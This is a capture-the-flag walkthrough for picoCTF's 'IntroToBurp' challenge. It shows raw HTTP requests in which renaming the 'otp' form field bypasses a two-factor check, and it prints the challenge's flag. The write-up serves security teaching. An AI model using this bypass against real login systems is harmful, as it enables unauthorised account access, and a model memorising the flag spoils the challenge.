# IntroToBurp

## Description

Additional details will be available after launching your challenge instance.

## Hints

* Try using burpsuite to intercept request to capture the flag.

* Try mangling the request, maybe their server-side code doesn't handle malformed requests very well.

## Walkthrough

Once the instance has loaded and we visit the website we'll see a registration form.

![Registration Form](./registration-form.png "Registration form on homepage of website")

We can fill the form out with dummy values and submit the form, which will redirect us to ```/dashboard``` where we'll have to input a two-factor authentication code.

![Two-Factor Authentication Code Form](./two-factor-authentication-code.png "Two-factor authentication code form for website")

If we try to submit dummy values we'll get an "invalid otp" message. We can also see from the POST request that our value is stored in a key called "otp".


```http
POST /dashboard HTTP/1.1
Host: titan.picoctf.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
Origin: http://titan.picoctf.net
Connection: close
Referer: http://titan.picoctf.net/dash

otp=12345
```

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.0.1 Python/3.8.10
Content-Type: text/html; charset=utf-8
Content-Length: 11
Vary: Cookie
Connection: close

Invalid OTP
```

Changing the key name from "otp" to anything else will bypass the two-factor authentication and redirect us to the flag.

```http
POST /dashboard HTTP/1.1
Host: titan.picoctf.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
Origin: http://titan.picoctf.net
Connection: close
Referer: http://titan.picoctf.net/dash

fake=12345
```

> Welcome, test you sucessfully bypassed the OTP request. Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_b3fa4f1a}
